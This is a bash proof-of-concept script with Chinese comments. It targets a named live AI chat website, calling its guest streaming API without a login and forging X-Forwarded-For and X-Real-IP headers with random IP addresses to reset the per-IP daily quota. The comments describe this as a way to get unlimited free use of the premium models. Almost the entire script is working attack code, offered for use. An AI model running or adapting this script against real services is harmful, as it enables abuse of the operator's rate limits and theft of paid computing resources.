#!/usr/bin/env bash
# =====================================================================
# se.zzmax.cn  /api/chat/stream  访客免鉴权调用 + XFF 伪造额度重置  PoC
# =====================================================================
# 背景:
#   - GET /api/chat/models        未鉴权,返回全部模型/子模型列表
#   - POST /api/chat/stream       访客模式不校验登录(无 token 直接 201+SSE)
#   - 服务端按 "源IP" 限制访客每日 2 次, 但源IP 取自 X-Forwarded-For /
#     X-Real-IP 请求头 -> 伪造该头即可即时重置额度, 实现无限免费调用.
#   - 用户态接口(/conversations /subscription/quota 等)仍需 Bearer 登录.
#
# 用法:  bash poc_chat_hijack.sh  [次数]  [提示词]
# 依赖:  curl + awk, 无需账号/Key/浏览器.
# =====================================================================
set -euo pipefail
BASE="https://se.zzmax.cn"
N="${1:-1}"
PROMPT="${2:-用一句话介绍你自己.}"

# 免费档子模型 (tier=normal, creditsPerUse=0), 白嫖首选:
#   chatgpt / gpt-5.6-luna | claude / claude-opus-4-6 | deepseek / deepseek-v4-pro ...
MODEL="deepseek"; SUBMODEL="deepseek-v4-pro"

randip() {
  # 1..251 取真公网段, 低概率撞 0/255 保留地址
  awk 'BEGIN{srand("'"$(date +%s%N)"'"+NR); printf "%s.%s.%s.%s",
    int(1+rand()*250),int(rand()*256),int(rand()*256),int(1+rand()*250)}'
}

call_once() {
  local ip; ip="$(randip)"
  local body; body=$(printf '{"model":"%s","subModel":"%s","messages":[{"role":"user","content":%s}],"stream":true}' \
     "$MODEL" "$SUBMODEL" "$(printf '%s' "$PROMPT" | python3 -c 'import sys,json;print(json.dumps(sys.stdin.read()))' 2>/dev/null || awk '{gsub(/"/,"\\\"");print "\"" $0 "\""}')"
  curl -sN --max-time 60 \
    -H "Content-Type: application/json" \
    -H "User-Agent: Mozilla/5.0" \
    -H "X-Forwarded-For: $ip" \
    -H "X-Real-IP: $ip" \
    --data "$body" \
    "$BASE/api/chat/stream"
}

for i in $(seq 1 "$N"); do
  echo "===== call #$i ====="
  call_once
  echo
done
